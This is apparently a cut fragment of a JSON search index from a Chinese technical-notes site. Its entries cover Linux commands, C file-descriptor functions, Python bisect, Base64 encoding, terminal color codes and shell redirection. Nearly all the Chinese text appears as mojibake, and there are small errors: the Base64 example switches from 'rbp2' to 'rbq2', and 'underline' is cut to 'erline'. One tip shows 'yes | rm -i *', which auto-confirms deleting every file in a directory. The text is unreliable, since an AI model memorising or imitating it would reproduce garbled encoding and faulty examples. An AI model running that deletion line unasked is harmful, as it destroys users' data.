æœå¯»ä¸åœ¨ä¸Šè¿°ä¸‰ä¸ªé¡¹ç›®ä¸­çš„å…¶ä»–æ–‡ä»¶","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-whereis.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-whereis.html"},{"title":"wireshark","text":"å›¾å½¢æ¥å£å°åŒ…çš„è·å–ï¼Œä¸ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/tcpdump çš„åŒºåˆ«æ˜¯tcpdumpæ˜¯æ–‡å­—æ¥å£å°åŒ…è·å– è¿™ç©æ„å„¿å¥½åƒæ˜¯ä¸€ä¸ªè½¯ä»¶","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-wireshark.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-wireshark.html"},{"title":"yes","text":"ä¸€ç›´è¾“å‡ºyæ¢è¡Œ, å¯¹äºæœ‰äº›äº¤äº’å¼çš„æŒ‡ä»¤ä¸”éœ€è¦è¾“å…¥yæ¥ç¡®è®¤æ—¶å¯ä»¥ä½¿ç”¨, æ¯”å¦‚: yes | apt install ssh æ•ˆæœç­‰ä»·äº: apt install ssh -y yeså‘½ä»¤ç”¨äºé‡å¤è¾“å‡ºå­—ç¬¦ä¸²ï¼ˆoutput a string repeatedly until killedï¼‰ã€‚ è¿™ä¸ªå‘½ä»¤å¯ä»¥å¸®ä½ è‡ªåŠ¨å›ç­”å‘½ä»¤è¡Œæç¤ºï¼Œ ä¾‹å¦‚ï¼Œè¿›å…¥ä¸€ä¸ªå«æœ‰å¤šä¸ªæ–‡ä»¶çš„ç›®å½•ï¼Œæ‰§è¡Œ: yes | rm -i * æ‰€æœ‰çš„: rm: remove regular empty file `xxx'? æç¤ºéƒ½ä¼šè¢«è‡ªåŠ¨å›ç­” yã€‚è¿™åœ¨ç¼–å†™è„šæœ¬ç¨‹åºçš„æ—¶å€™ä¼šå¾ˆç”¨å¤„ã€‚ yeså‘½ä»¤è¿˜æœ‰å¦å¤–ä¸€ä¸ªç”¨é€”ï¼Œå¯ä»¥ç”¨æ¥ç”Ÿæˆå¤§çš„æ–‡æœ¬æ–‡ä»¶ã€‚ï¼ˆ-iäº¤äº’å¼ï¼‰ å‚æ•° i ä¼šäº¤äº’å¼è¯¢é—® yes åé¢ç›´æ¥è·Ÿå•è¯æˆ–è€…å­—ç¬¦è¡¨ç¤ºä¸€ç›´è¾“å‡ºè¿™ä¸ª","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-yes.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-yes.html"},{"title":"bisect","text":"bisect --- æ•°ç»„äºŒåˆ†æŸ¥æ‰¾ç®—æ³• å®˜ç½‘: https://docs.python.org/zh-cn/3/library/bisect.html è¿™ä¸ªæ¨¡å—å¯¹æœ‰åºåˆ—è¡¨æä¾›äº†æ”¯æŒï¼Œä½¿å¾—ä»–ä»¬å¯ä»¥åœ¨æ’å…¥æ–°æ•°æ®ä»ç„¶ä¿æŒæœ‰åºã€‚ å¯¹äºé•¿åˆ—è¡¨ï¼Œå¦‚æœå…¶åŒ…å«å…ƒç´ çš„æ¯”è¾ƒæ“ä½œååˆ†æ˜‚è´µçš„è¯ï¼Œè¿™å¯ä»¥æ˜¯å¯¹æ›´å¸¸è§æ–¹æ³•çš„æ”¹è¿›ã€‚ è¿™ä¸ªæ¨¡å—å«åš bisect å› ä¸ºå…¶ä½¿ç”¨äº†åŸºæœ¬çš„äºŒåˆ†ï¼ˆbisectionï¼‰ç®—æ³•ã€‚æºä»£ç ä¹Ÿå¯ä»¥ä½œä¸ºå¾ˆæ£’çš„ç®—æ³•ç¤ºä¾‹ï¼ˆè¾¹ç•Œåˆ¤æ–­ä¹Ÿåšå¥½å•¦ï¼ï¼‰ æ”¯æŒçš„å‡½æ•° å½“ä½¿ç”¨ bisect() å’Œ insort() ç¼–å†™æ—¶é—´æ•æ„Ÿçš„ä»£ç æ—¶ï¼Œè¯·è®°ä½ä»¥ä¸‹æ¦‚å¿µ: äºŒåˆ†æ³•å¯¹äºæœç´¢ä¸€å®šèŒƒå›´çš„å€¼æ˜¯å¾ˆé«˜æ•ˆçš„ã€‚ å¯¹äºå®šä½ç‰¹å®šçš„å€¼ï¼Œåˆ™å­—å…¸çš„æ€§èƒ½æ›´å¥½ã€‚ insort() å‡½æ•°çš„æ—¶é—´å¤æ‚åº¦ä¸º O(n) å› ä¸ºå¯¹æ•°æ—¶é—´çš„æœç´¢æ­¥éª¤è¢«çº¿æ€§æ—¶é—´çš„æ’å…¥æ­¥éª¤æ‰€ä¸»å¯¼ã€‚ è¿™äº›æœç´¢å‡½æ•°éƒ½æ˜¯æ— çŠ¶æ€çš„å¹¶ä¸”ä¼šåœ¨å®ƒä»¬è¢«ä½¿ç”¨åä¸¢å¼ƒé”®å‡½æ•°çš„ç»“æœã€‚ å› æ­¤ï¼Œå¦‚æœåœ¨ä¸€ä¸ªå¾ªç¯ä¸­ä½¿ç”¨æœç´¢å‡½æ•°ï¼Œåˆ™é”®å‡½æ•°å¯èƒ½ä¼šåœ¨åŒä¸€ä¸ªæ•°æ®å…ƒç´ ä¸Šè¢«åå¤è°ƒç”¨ã€‚ å¦‚æœé”®å‡½æ•°é€Ÿåº¦ä¸å¿«ï¼Œè¯·è€ƒè™‘ç”¨ functools.cache() æ¥åŒ…è£…å®ƒä»¥é¿å…é‡å¤è®¡ç®—ã€‚ å¦å¤–ï¼Œä¹Ÿå¯ä»¥è€ƒè™‘æœç´¢ä¸€ä¸ªé¢„å…ˆè®¡ç®—å¥½çš„é”®æ•°ç»„æ¥å®šä½æ’å…¥ç‚¹ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-bisect.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-bisect.html"},{"title":"Base64ç¼–ç ","text":"ç¼–ç è¡¨: | **ç´¢å¼•** | **å¯¹åº”å­—ç¬¦** | **ç´¢å¼•** | **å¯¹åº”å­—ç¬¦** | **ç´¢å¼•** | **å¯¹åº”å­—ç¬¦** | **ç´¢å¼•** | **å¯¹åº”å­—ç¬¦** | | ------ | -------- | ------ | -------- | ------ | -------- | ------ | -------- | | 0 | **A** | 17 | **R** | 34 | **i** | 51 | **z** | | 1 | **B** | 18 | **S** | 35 | **j** | 52 | **0** | | 2 | **C** | 19 | **T** | 36 | **k** | 53 | **1** | | 3 | **D** | 20 | **U** | 37 | **l** | 54 | **2** | | 4 | **E** | 21 | **V** | 38 | **m** | 55 | **3** | | 5 | **F** | 22 | **W** | 39 | **n** | 56 | **4** | | 6 | **G** | 23 | **X** | 40 | **o** | 57 | **5** | | 7 | **H** | 24 | **Y** | 41 | **p** | 58 | **6** | | 8 | **I** | 25 | **Z** | 42 | **q** | 59 | **7** | | 9 | **J** | 26 | **a** | 43 | **r** | 60 | **8** | | 10 | **K** | 27 | **b** | 44 | **s** | 61 | **9** | | 11 | **L** | 28 | **c** | 45 | **t** | 62 | **+** | | 12 | **M** | 29 | **d** | 46 | **u** | 63 | **/** | | 13 | **N** | 30 | **e** | 47 | **v** | | | | 14 | **O** | 31 | **f** | 48 | **w** | | | | 15 | **P** | 32 | **g** | 49 | **x** | | | | 16 | **Q** | 33 | **h** | 50 | **y** | | | ä¾‹å­ï¼š è½¬æ¢å‰ 10101101,10111010,01110110 è½¬æ¢å 00101011, 00011011 ,00101001 ,00110110 åè¿›åˆ¶ 43 27 41 54 å¯¹åº”ç è¡¨ä¸­çš„å€¼ r b p 2 æ‰€ä»¥ä¸Šé¢çš„24ä½ç¼–ç ï¼Œç¼–ç åçš„Base64å€¼ä¸º rbp2 è§£ç åŒç†ï¼ŒæŠŠ rbq2 çš„äºŒè¿›åˆ¶ä½è¿æ¥ä¸Šå†é‡ç»„å¾—åˆ°ä¸‰ä¸ª8ä½å€¼ï¼Œå¾—å‡ºåŸç ã€‚ ï¼ˆè§£ç åªæ˜¯ç¼–ç çš„é€†è¿‡ç¨‹ï¼Œæœ‰å…³MIMEçš„RFCè¿˜æœ‰å¾ˆå¤šï¼Œå¦‚æœéœ€è¦è¯¦ç»†æƒ…å†µè¯·è‡ªè¡ŒæŸ¥æ‰¾ã€‚ï¼‰ è¿‡ç¨‹ï¼š ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼Œæ ¹æ®æºå­—èŠ‚çš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¤„ç†ã€‚ è§„åˆ™ï¼šæºç¬¬ä¸€å­—èŠ‚å³ç§»ä¸¤ä½ï¼Œå»æ‰ä½2ä½ï¼Œé«˜2ä½è¡¥é›¶ã€‚ æ—¢ï¼š00 + é«˜6ä½ ç¬¬äºŒä¸ªå­—èŠ‚ï¼Œæ ¹æ®æºå­—èŠ‚çš„ç¬¬ä¸€ä¸ªå­—èŠ‚å’Œç¬¬äºŒä¸ªå­—èŠ‚è”åˆå¤„ç†ã€‚ è§„åˆ™å¦‚ä¸‹ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚é«˜6ä½å»æ‰ç„¶åå·¦ç§»å››ä½ï¼Œç¬¬äºŒä¸ªå­—èŠ‚å³ç§»å››ä½ å³ï¼šæºç¬¬ä¸€å­—èŠ‚ä½2ä½ + æºç¬¬2å­—èŠ‚é«˜4ä½ ç¬¬ä¸‰ä¸ªå­—èŠ‚ï¼Œæ ¹æ®æºå­—èŠ‚çš„ç¬¬äºŒä¸ªå­—èŠ‚å’Œç¬¬ä¸‰ä¸ªå­—èŠ‚è”åˆå¤„ç†ï¼Œ è§„åˆ™ç¬¬äºŒä¸ªå­—èŠ‚å»æ‰é«˜4ä½å¹¶å·¦ç§»ä¸¤ä½ï¼ˆå¾—é«˜6ä½ï¼‰ï¼Œç¬¬ä¸‰ä¸ªå­—èŠ‚å³ç§»6ä½å¹¶å»æ‰é«˜6ä½ï¼ˆå¾—ä½2ä½ï¼‰ï¼Œç›¸åŠ å³å¯ ç¬¬å››ä¸ªå­—èŠ‚ï¼Œè§„åˆ™ï¼Œæºç¬¬ä¸‰å­—èŠ‚å»æ‰é«˜2ä½å³å¯: //ç”¨æ›´æ¥è¿‘äºç¼–ç¨‹çš„æ€ç»´æ¥è¯´ï¼Œç¼–ç çš„è¿‡ç¨‹æ˜¯è¿™æ ·çš„ï¼š //ç¬¬ä¸€ä¸ªå­—ç¬¦é€šè¿‡å³ç§»2ä½è·å¾—ç¬¬ä¸€ä¸ªç›®æ ‡å­—ç¬¦çš„Base64è¡¨ä½ç½®ï¼Œæ ¹æ®è¿™ä¸ªæ•°å€¼å–åˆ°è¡¨ä¸Šç›¸åº”çš„å­—ç¬¦ï¼Œå°±æ˜¯ç¬¬ä¸€//ä¸ªç›®æ ‡å­—ç¬¦ã€‚ //ç„¶åå°†ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸0x03(00000011)è¿›è¡Œä¸(&)æ“ä½œå¹¶å·¦ç§»4ä½,æ¥ç€ç¬¬äºŒä¸ªå­—ç¬¦å³ç§»4ä½ä¸å‰è€…ç›¸æˆ–(|)ï¼Œå³è·å¾—ç¬¬äºŒä¸ªç›®æ ‡å­—ç¬¦ã€‚ //å†å°†ç¬¬äºŒä¸ªå­—ç¬¦ä¸0x0f(00001111)è¿›è¡Œä¸(&)æ“ä½œå¹¶å·¦ç§»2ä½,æ¥ç€ç¬¬ä¸‰ä¸ªå­—ç¬¦å³ç§»6ä½ä¸å‰è€…ç›¸æˆ–(|)ï¼Œè·å¾—ç¬¬ä¸‰ä¸ªç›®æ ‡å­—ç¬¦ã€‚ //æœ€åå°†ç¬¬ä¸‰ä¸ªå­—ç¬¦ä¸0x3f(00111111)è¿›è¡Œä¸(&)æ“ä½œå³è·å¾—ç¬¬å››ä¸ªç›®æ ‡å­—ç¬¦ã€‚ //åœ¨ä»¥ä¸Šçš„æ¯ä¸€ä¸ªæ­¥éª¤ä¹‹åï¼Œå†æŠŠç»“æœä¸ 0x3F è¿›è¡Œ AND [ä½æ“ä½œ](https://baike.baidu.com/item/ä½æ“ä½œ) ï¼Œå°±å¯ä»¥å¾—åˆ°ç¼–ç åçš„å­—ç¬¦äº†ã€‚ åŸæ–‡çš„å­—èŠ‚æ•°é‡åº”è¯¥æ˜¯3çš„å€æ•°ï¼Œå¦‚æœè¿™ä¸ªæ¡ä»¶ä¸èƒ½æ»¡è¶³çš„è¯ï¼Œå…·ä½“çš„è§£å†³åŠæ³•æ˜¯è¿™æ ·çš„ï¼š åŸæ–‡å‰©ä½™çš„å­—èŠ‚æ ¹æ®ç¼–ç è§„åˆ™ç»§ç»­å•ç‹¬è½¬(1å˜2ï¼Œ2å˜3ï¼›ä¸å¤Ÿçš„ä½æ•°ç”¨0è¡¥å…¨)ï¼Œå†ç”¨=å·è¡¥æ»¡4ä¸ªå­—èŠ‚ã€‚ è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæœ‰äº›Base64ç¼–ç ä¼šä»¥ä¸€ä¸ªæˆ–ä¸¤ä¸ªç­‰å·ç»“æŸçš„åŸå› ï¼Œä½†ç­‰å·æœ€å¤šåªæœ‰ä¸¤ä¸ªã€‚ å› ä¸ºä¸€ä¸ªåŸå­—èŠ‚è‡³å°‘ä¼šå˜æˆä¸¤ä¸ªç›®æ ‡å­—èŠ‚ï¼Œæ‰€ä»¥ä½™æ•°ä»»ä½•æƒ…å†µä¸‹éƒ½åªå¯èƒ½æ˜¯0ï¼Œ1ï¼Œ2è¿™ä¸‰ä¸ªæ•°ä¸­çš„ä¸€ä¸ªã€‚ å¦‚æœä½™æ•°æ˜¯0çš„è¯ï¼Œå°±è¡¨ç¤ºåŸæ–‡å­—èŠ‚æ•°æ­£å¥½æ˜¯3çš„å€æ•°ï¼ˆæœ€ç†æƒ³çš„æƒ…å†µï¼‰ã€‚ å¦‚æœæ˜¯1çš„è¯ï¼Œè½¬æˆ2ä¸ªBase64ç¼–ç å­—ç¬¦ï¼Œä¸ºäº†è®©Base64ç¼–ç æ˜¯4çš„å€æ•°ï¼Œå°±è¦è¡¥2ä¸ªç­‰å·ï¼› åŒç†ï¼Œå¦‚æœæ˜¯2çš„è¯ï¼Œå°±è¦è¡¥1ä¸ªç­‰å·ã€‚ åŸç†ï¼šä¸‰ä¸ªå­—èŠ‚çš„å…«ä¸ªå­—ç¬¦ = å››ä¸ªå­—èŠ‚çš„å…­ä¸ªå­—ç¬¦ ï¼ˆ3*8=4*6ï¼‰ æµç¨‹ï¼š 1ã€å°†å­—ç¬¦è½¬ä¸ºascii 2ã€å°†asciiè½¬ä¸ºäºŒè¿›åˆ¶ 3ã€åŸæœ‰çš„ä¸‰å­—èŠ‚åœ¨è¿™é‡Œä»¥æºä¸€ã€äºŒã€ä¸‰ä»£è¡¨ è½¬æ¢åçš„ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼š00 + æºä¸€çš„é«˜å…­ä½å­—ç¬¦ è½¬æ¢åçš„ç¬¬äºŒä¸ªå­—èŠ‚ï¼š00 + æºä¸€çš„ä½äºŒä½å­—ç¬¦ + æºäºŒçš„é«˜å››ä½å­—ç¬¦ è½¬æ¢åçš„ç¬¬ä¸‰ä¸ªå­—èŠ‚ï¼š00 + æºäºŒçš„ä½å››ä½å­—ç¬¦ + æºä¸‰çš„é«˜äºŒä½å­—ç¬¦ è½¬æ¢åçš„ç¬¬å››ä¸ªå­—èŠ‚ï¼š00 + æºä¸‰çš„ä½å…­ä½å­—ç¬¦ 4ã€è½¬æ¢çš„äºŒè¿›åˆ¶è½¬æ¢ä¸ºåè¿›åˆ¶ï¼Œæ ¹æ®ç¼–ç è¡¨ç¼–ç  æ³¨æ„ï¼šè½¬æ¢åçš„ç¼–ç é»˜è®¤æ¯76ä¸ªå­—ç¬¦æ¢è¡Œï¼Œè‹¥ä¸éœ€æ¢è¡Œï¼Œshellä¸­ base64 -w 0å³å¯: base64 # ç¼–ç  base64 -w num # æŒ‡å®šä»¥å¤šå°‘ä¸ªå­—ç¬¦æ¢è¡Œï¼Œä¸º0åˆ™å¹¶ä¸æ¢è¡Œ base64 -d # è§£ç ","tags":"æ‚ä¹±æ— ç« ","url":"/yq-doc-source-docs-Chaotic-Base64-encoding.html","loc":"/yq-doc-source-docs-Chaotic-Base64-encoding.html"},{"title":"dup","text":"dup()ç”¨æ¥å¤åˆ¶å‚æ•°oldfd æ‰€æŒ‡çš„æ–‡ä»¶æè¿°è¯, å¹¶å°†å®ƒè¿”å›. æ­¤æ–°çš„æ–‡ä»¶æè¿°è¯å’Œå‚æ•°oldfd æŒ‡çš„æ˜¯åŒä¸€ä¸ªæ–‡ä»¶, å…±äº«æ‰€æœ‰çš„é”å®šã€è¯»å†™ä½ç½®å’Œå„é¡¹æƒé™æˆ–æ——æ ‡. ä¾‹å¦‚, å½“åˆ©ç”¨lseek()å¯¹æŸä¸ªæ–‡ä»¶æè¿°è¯ä½œç”¨æ—¶, å¦ä¸€ä¸ªæ–‡ä»¶æè¿°è¯çš„è¯»å†™ä½ç½®ä¹Ÿä¼šéšç€æ”¹å˜. ä¸è¿‡, æ–‡ä»¶æè¿°è¯ä¹‹é—´å¹¶ä¸å…±äº«close-on-exec æ——æ ‡. è¿”å›å€¼ å½“å¤åˆ¶æˆåŠŸæ—¶, åˆ™è¿”å›æœ€å°åŠå°šæœªä½¿ç”¨çš„æ–‡ä»¶æè¿°è¯. è‹¥æœ‰é”™è¯¯åˆ™è¿”å›-1, errno ä¼šå­˜æ”¾é”™è¯¯ä»£ç . dupä¸dup2 APUEå’Œmanæ–‡æ¡£éƒ½ç”¨ä¸€å¥è¯ç®€æ˜çš„è¯´å‡ºäº†è¿™ä¸¤ä¸ªå‡½æ•°çš„ä½œç”¨: å¤åˆ¶ä¸€ä¸ªç°å­˜çš„æ–‡ä»¶æè¿°ç¬¦ #include <unistd.h> int dup(int oldfd); int dup2(int oldfd, int newfd);123 å½“è°ƒç”¨dupå‡½æ•°æ—¶ï¼Œå†…æ ¸åœ¨è¿›ç¨‹ä¸­åˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œ æ­¤æè¿°ç¬¦æ˜¯å½“å‰å¯ç”¨æ–‡ä»¶æè¿°ç¬¦çš„æœ€å°æ•°å€¼ï¼Œè¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦æŒ‡å‘oldfdæ‰€æ‹¥æœ‰çš„æ–‡ä»¶è¡¨é¡¹ã€‚ dup2å’Œdupçš„åŒºåˆ«å°±æ˜¯å¯ä»¥ç”¨newfdå‚æ•°æŒ‡å®šæ–°æè¿°ç¬¦çš„æ•°å€¼ï¼Œ å¦‚æœnewfdå·²ç»æ‰“å¼€ï¼Œåˆ™å…ˆå°†å…¶å…³é—­ã€‚ å¦‚æœnewfdç­‰äºoldfdï¼Œåˆ™dup2è¿”å›newfd, è€Œä¸å…³é—­å®ƒã€‚dup2å‡½æ•°è¿”å›çš„æ–°æ–‡ä»¶æè¿°ç¬¦åŒæ ·ä¸å‚æ•°oldfdå…±äº«åŒä¸€æ–‡ä»¶è¡¨é¡¹ã€‚ APUEç”¨å¦å¤–ä¸€ä¸ªç§æ–¹æ³•è¯´æ˜äº†è¿™ä¸ªé—®é¢˜: å®é™…ä¸Šï¼Œè°ƒç”¨dup(oldfd)ç­‰æ•ˆäºï¼Œ fcntl(oldfd, F_DUPFD, 0) è€Œè°ƒç”¨dup2(oldfd, newfd)ç­‰æ•ˆäºï¼Œ close(oldfd)ï¼›fcntl(oldfd, F_DUPFD, newfd)ï¼› æ³¨è§£ æ•´ç†çš„æ—¶å€™å‘ç°ä»¥åŠä¸è®°å¾—å½“åˆæ˜¯ä¸ºä»€ä¹ˆæŸ¥è¿™ä¸ªäº†","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Built--in-function-dup.html","loc":"/yq-doc-source-docs-operating-system-linux-Built--in-function-dup.html"},{"title":"dup2","text":"dup2()ç”¨æ¥å¤åˆ¶å‚æ•°oldfd æ‰€æŒ‡çš„æ–‡ä»¶æè¿°è¯, å¹¶å°†å®ƒæ‹·è´è‡³å‚æ•°newfd åä¸€å—è¿”å›. è‹¥å‚æ•°newfdä¸ºä¸€å·²æ‰“å¼€çš„æ–‡ä»¶æè¿°è¯, åˆ™newfd æ‰€æŒ‡çš„æ–‡ä»¶ä¼šå…ˆè¢«å…³é—­. dup2()æ‰€å¤åˆ¶çš„æ–‡ä»¶æè¿°è¯, ä¸åŸæ¥çš„æ–‡ä»¶æè¿°è¯å…±äº«å„ç§æ–‡ä»¶çŠ¶æ€, è¯¦æƒ…å¯å‚è€ƒ /docs/æ“ä½œç³»ç»Ÿ/linux/å†…ç½®å‡½æ•°/dup è¿”å›å€¼ å½“å¤åˆ¶æˆåŠŸæ—¶, åˆ™è¿”å›æœ€å°åŠå°šæœªä½¿ç”¨çš„æ–‡ä»¶æè¿°è¯. è‹¥æœ‰é”™è¯¯åˆ™è¿”å›-1, errno ä¼šå­˜æ”¾é”™è¯¯ä»£ç .","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Built--in-function-dup2.html","loc":"/yq-doc-source-docs-operating-system-linux-Built--in-function-dup2.html"},{"title":"getcwd","text":"è·å–å½“å‰ç›®å½• getcwd() failed æŠ¥é”™: sh: 0: getcwd() failed: No such file or directory åœ¨ä¸€ä¸ªä¸å­˜åœ¨çš„ç›®å½•ä¸Šæ‰§è¡Œå‘½ä»¤ï¼Œä¼šæŠ¥ä¸Šè¿°é”™è¯¯ï¼Œ è¿™ä¸ªç›®å½•æ˜¯æ›¾ç»å­˜åœ¨ï¼Œ åæ¥ç»™åˆ é™¤äº†ï¼Œä½†æŸäº›ç®¡ç†å·¥å…·çš„å‘½ä»¤è¿˜å­˜åœ¨äºè¿™ä¸ªç›®å½•ä¸‹æ‰§è¡Œã€‚ä¼šæŠ¥ä¸Šè¿°é”™è¯¯ æ–¹æ³•æ˜¯ æ¢ç›®å½•","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Built--in-function-getcwd.html","loc":"/yq-doc-source-docs-operating-system-linux-Built--in-function-getcwd.html"},{"title":"wait","text":"Linuxå†…æ ¸å­¦ä¹ ç¬”è®° - waitã€waitpidã€wait3 å’Œ wait4 Linuxä¸‹æœ‰å››ä¸ªwaitå‡½æ•°ï¼š wait() å½“è¿›ç¨‹è°ƒç”¨waitæ—¶ï¼Œä¼šæš‚åœç›®å‰è¿›ç¨‹çš„æ‰§è¡Œï¼ˆå³é˜»å¡ï¼‰ï¼Œç”±wait() æ¥è‡ªåŠ¨åˆ†ææ˜¯å¦å½“å‰è¿›ç¨‹çš„æŸä¸ªå­è¿›ç¨‹å·²é€€å‡ºï¼Œ å¦‚æœæ‰¾åˆ°äº†ä¸€ä¸ªå·²ç»å˜æˆå˜æˆåƒµå°¸è¿›ç¨‹çš„å­è¿›ç¨‹ï¼Œwait å°±ä¼šæ”¶é›†è¿™ä¸ªå­è¿›ç¨‹çš„ä¿¡æ¯ï¼Œå¹¶å°†å…¶å½»åº•é”€æ¯åè¿”å›ï¼› å¦‚æœæ²¡æœ‰æ‰¾åˆ°è¿™æ ·ä¸€ä¸ªå­è¿›ç¨‹ï¼Œwait å°±ä¼šä¸€ç›´é˜»å¡åœ¨è¿™é‡Œï¼Œç›´åˆ°å‡ºç°åƒµå°¸è¿›ç¨‹ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Built--in-function-wait.html","loc":"/yq-doc-source-docs-operating-system-linux-Built--in-function-wait.html"},{"title":"é¢œè‰²è¡¨ä¸ä»£ç è¡¨","text":"é¢œè‰²è¡¨ å‰æ™¯ èƒŒæ™¯ é¢œè‰² 30 40 é»‘è‰² 31 41 ç´…è‰² 32 42 ç¶ è‰² 33 43 é»ƒè‰² 34 44 è—è‰² 35 45 ç´«ç´…è‰² 36 46 é’è—è‰² 37 47 ç™½è‰² ä»£ç è¡¨ ä»£ç  æ„ä¹‰ 0 OFF 1 é«˜äº®æ˜¾ç¤º 4 erline 5 é—ªçƒ 7 åç™½æ˜¾ç¤º 8 ä¸å¯è§","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-Color-table-and-code-table.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-Color-table-and-code-table.html"},{"title":"é‡å®šå‘","text":"æ–‡ä»¶æè¿°ç¬¦ å½“æ‰§è¡Œshellå‘½ä»¤æ—¶ï¼Œä¼šé»˜è®¤æ‰“å¼€3ä¸ªæ–‡ä»¶ï¼Œæ¯ä¸ªæ–‡ä»¶æœ‰å¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦æ¥æ–¹ä¾¿æˆ‘ä»¬ä½¿ç”¨ ç±»å‹ æ–‡ä»¶æè¿°ç¬¦ é»˜è®¤æƒ…å†µ å¯¹åº”æ–‡ä»¶å¥æŸ„ä½ç½® æ ‡å‡†è¾“å…¥ï¼ˆstandard inputï¼‰ 0 ä»é”®ç›˜è·å¾—è¾“å…¥ /proc/self/fd/0 æ ‡å‡†è¾“å‡ºï¼ˆstandard outputï¼‰ 1 è¾“å‡ºåˆ°å±å¹•ï¼ˆå³æ§åˆ¶å°ï¼‰ /proc/self/fd/1 é”™è¯¯è¾“å‡ºï¼ˆerror outputï¼‰ 2 è¾“å‡ºåˆ°å±å¹•ï¼ˆå³æ§åˆ¶å°ï¼‰ /proc/self/fd/2 æ‰€ä»¥æˆ‘ä»¬å¹³æ—¶åœ¨æ‰§è¡Œshellå‘½ä»¤ä¸­ï¼Œéƒ½é»˜è®¤æ˜¯ä»é”®ç›˜è·å¾—è¾“å…¥ï¼Œ å¹¶ä¸”å°†ç»“æœè¾“å‡ºåˆ°æ§åˆ¶å°ä¸Šã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡æ›´æ”¹æ–‡ä»¶æè¿°ç¬¦é»˜è®¤çš„æŒ‡å‘ï¼Œ ä»è€Œå®ç°è¾“å…¥è¾“å‡ºçš„é‡å®šå‘ã€‚æ¯”å¦‚æˆ‘ä»¬å°†1æŒ‡å‘æ–‡ä»¶ï¼Œé‚£ä¹ˆæ ‡å‡†çš„è¾“å‡ºå°±ä¼šè¾“å‡ºåˆ°æ–‡ä»¶ä¸­ã€‚ è¾“å‡ºé‡å®šå‘ è¾“å‡ºé‡å®šå‘çš„ä½¿ç”¨æ–¹å¼å¾ˆç®€å•ï¼ŒåŸºæœ¬çš„ä¸€äº›å‘½ä»¤å¦‚ä¸‹: command >filename æŠŠæ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°æ–°æ–‡ä»¶ä¸­ command 1>filename åŒä¸Š command >>filename æŠŠæ ‡å‡†è¾“å‡ºè¿½åŠ åˆ°æ–‡ä»¶ä¸­ command 1>>filename åŒä¸Š command 2>filename æŠŠæ ‡å‡†é”™è¯¯é‡å®šå‘åˆ°æ–°æ–‡ä»¶ä¸­ command 2>>filename æŠŠæ ‡å‡†é”™è¯¯è¿½åŠ åˆ°æ–°æ–‡ä»¶ä¸­ æˆ‘ä»¬ä½¿ç”¨>æˆ–è€…>>å¯¹è¾“å‡ºè¿›è¡Œé‡å®šå‘ã€‚ ç¬¦å·çš„å·¦è¾¹è¡¨ç¤ºæ–‡ä»¶æè¿°ç¬¦ï¼Œå¦‚æœæ²¡æœ‰çš„è¯è¡¨ç¤º1ï¼Œä¹Ÿå°±æ˜¯æ ‡å‡†è¾“å‡ºï¼Œ ç¬¦å·çš„å³è¾¹å¯ä»¥æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªè¾“å‡ºè®¾å¤‡ã€‚ å½“ä½¿ç”¨>æ—¶ï¼Œä¼šåˆ¤æ–­å³è¾¹çš„æ–‡ä»¶å­˜ä¸å­˜åœ¨ï¼Œ å¦‚æœå­˜åœ¨çš„è¯å°±å…ˆåˆ é™¤ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶ï¼Œ ä¸å­˜åœ¨çš„è¯åˆ™ç›´æ¥åˆ›å»ºã€‚ ä½†æ˜¯å½“ä½¿ç”¨>>è¿›è¡Œè¿½åŠ æ—¶ï¼Œåˆ™ä¸ä¼šåˆ é™¤åŸæ¥å·²ç»å­˜åœ¨çš„æ–‡ä»¶ã€‚ ï¼ˆè¿™é‡Œ>çš„åˆ›å»ºåªèƒ½åˆ›å»ºåœ¨å·²ç»å­˜åœ¨çš„ç›®å½•ä¸‹ï¼Œç›®å½•ä¸å­˜åœ¨åˆ™æŠ¥é”™ï¼‰ è¾“å…¥é‡å®šå‘ åœ¨ç†è§£äº†è¾“å‡ºé‡å®šå‘ä¹‹åï¼Œç†è§£è¾“å…¥é‡å®šå‘å°±ä¼šå®¹æ˜“å¾—å¤šã€‚å¯¹è¾“å…¥é‡å®šå‘çš„åŸºæœ¬å‘½ä»¤å¦‚ä¸‹: command <filename ä»¥filenameæ–‡ä»¶ä½œä¸ºæ ‡å‡†è¾“å…¥ command 0<filename åŒä¸Š command <<delimiter ä»æ ‡å‡†è¾“å…¥ä¸­è¯»å…¥ï¼Œç›´åˆ°é‡åˆ°delimiteråˆ†éš”ç¬¦ command <<<delimiter ä»æ ‡å‡†è¾“å…¥ä¸­è¯»å…¥å˜é‡ 